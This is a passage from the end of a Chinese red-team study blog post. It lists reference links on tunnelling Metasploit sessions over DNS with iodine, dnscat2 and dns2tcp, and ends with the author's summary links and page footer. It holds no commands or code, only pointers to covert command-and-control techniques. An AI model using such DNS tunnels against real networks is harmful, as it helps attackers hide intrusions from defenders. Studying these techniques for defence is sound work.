+https:<span class="hljs-regexp">//</span>juejin.im<span class="hljs-regexp">/post/</span><span class="hljs-number">6844903767461068807</span></code></pre><p>书上介绍了MSF配合lodine使用方法…</p><h3 id="使用dns协议上线msf之dnscat2"><a href="#使用dns协议上线msf之dnscat2" class="headerlink" title="使用dns协议上线msf之dnscat2"></a>使用dns协议上线msf之dnscat2</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1672113</span></code></pre><p>书上介绍了MSF配合dnscat2使用方法…</p><h3 id="使用dns协议上线msf之dns2tcp"><a href="#使用dns协议上线msf之dns2tcp" class="headerlink" title="使用dns协议上线msf之dns2tcp"></a>使用dns协议上线msf之dns2tcp</h3><p>这里只能看书了，这里树上很精彩，后期我会复现…</p><p>总结：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">7701</span>      --第四章总结工具文章
+http:<span class="hljs-regexp">//</span>www.feidao.site<span class="hljs-regexp">/wordpress/i</span>ndex.php<span class="hljs-regexp">/2020/</span><span class="hljs-number">04</span><span class="hljs-regexp">/11/yi</span>ngyong/<span class="hljs-comment">#toc-head-13  --好好看完</span>
+https:<span class="hljs-regexp">//</span><span class="hljs-number">2017</span>.zeronights.org<span class="hljs-regexp">/wp-content/u</span>ploads<span class="hljs-regexp">/materials/</span>ZN17_SintsovAndreyanov_MeterpreterReverseDNS.pdf</code></pre></div><hr><div><div class="post-metas mb-3"><div class="post-meta mr-3"><i class="iconfont icon-category"></i> <a class="hover-with-bg" href="/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/">红队攻防</a></div><div class="post-meta"><i class="iconfont icon-tags"></i> <a class="hover-with-bg" href="/tags/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/">红队攻防</a> <a class="hover-with-bg" href="/tags/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E7%BA%A2%E9%98%9F%E7%99%BE%E7%A7%91%E5%85%A8%E4%B9%A6/">渗透攻击红队百科全书</a></div></div><p class="note note-warning"><strong>本文作者: </strong><a href="/">iceH</a><br><strong>本文链接: </strong><a href="http://www.secice.cn/p/2197435e">http://www.secice.cn/p/2197435e</a><br><strong>版权声明: </strong>本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p><div class="post-prevnext row"><article class="post-prev col-6"><a href="/p/56572a0f"><i class="iconfont icon-arrowleft"></i> <span class="hidden-mobile">红队攻防学习之内部信息收集</span> <span class="visible-mobile">上一篇</span></a></article><article class="post-next col-6"><a href="/p/b25a2f1c"><span class="hidden-mobile">红队攻防学习之命令与控制</span> <span class="visible-mobile">下一篇</span> <i class="iconfont icon-arrowright"></i></a></article></div></div><article class="comments" id="comments"><div id="vcomments"></div><script type="text/javascript">Fluid.utils.waitElementVisible("vcomments",(function(){Fluid.utils.createScript("https://cdn.staticfile.org/valine/1.4.14/Valine.min.js",(function(){new Valine({el:"#vcomments",app_id:"MnjV8raNBztIVGGKiicFL3Sq-MdYXbMMI",app_key:"hS70MmgmzDqbMSkSAfkDe42h",placeholder:"留下你的小脚印吧...",path:window.location.pathname,avatar:"wavatar",meta:["nick","mail"],pageSize:"10",lang:"zh-CN",highlight:!1,recordIP:!1,serverURLs:""})}))}))</script><noscript>Please enable JavaScript to view the <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a></noscript></article></article></div></div></div><div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn"><div id="toc"><p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p><div class="toc-body" id="toc-body"></div></div></div></div></div><div class="col-lg-7 mx-auto nopadding-md"><div class="container custom post-custom mx-auto"><img src="/img/psb.gif" srcset="/img/loading.gif" class="rounded mx-auto d-block mt-5" style="width:300px;height:150px"></div></div><a id="scroll-top-button" href="#" role="button"><i class="iconfont icon-arrowup" aria-hidden="true"></i></a><div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true"><div class="modal-dialog modal-dialog-scrollable modal-lg" role="document"><div class="modal-content"><div class="modal-header text-center"><h4 class="modal-title w-100 font-weight-bold">搜索</h4><button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="modal-body mx-3"><div class="md-form mb-5"><input type="text" id="local-search-input" class="form-control validate"> <label data-error="x" data-success="v" for="local-search-input">关键词</label></div><div class="list-group" id="local-search-result"></div></div></div></div></div></main><footer class="text-center mt-5 py-3"><div class="footer-content"><span>iceH</span> <i class="iconfont icon-love"></i> <span>一条啥也不会的咸鱼！</span></div></footer><script src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js"></script><link rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css"><script>NProgress.configure({showSpinner:!1,trickleSpeed:200}),NProgress.start(),document.addEventListener("DOMContentLoaded",(function(){window.NProgress&&window.NProgress.inc()})),window.addEventListener("load",(function(){NProgress.done()}))</script><script src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js"></script><script src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js"></script><script src="/js/debouncer.js"></script><script src="/js/events.js"></script><script src="/js/plugins.js"></script><script src="/js/lazyload.js"></script><script src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js"></script><script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script><script src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js"></script><script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script><script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script><script>!function(t,i){(0,Fluid.plugins.typing)(i.getElementById("subtitle").title)}(window,document)</script><script src="/js/local-search.js"></script><script>document.querySelector("#local-search-input").onclick=function(){searchFunc("/local-search.xml","local-search-input","local-search-result"),this.onclick=null}</script><script src="/js/qipao.js"></script><script src="/js/jingtaisidai.js"></script><script src="/js/dianjichuzi.js"></script><script src="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="//cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="/js/boot.js"></script></body></html>
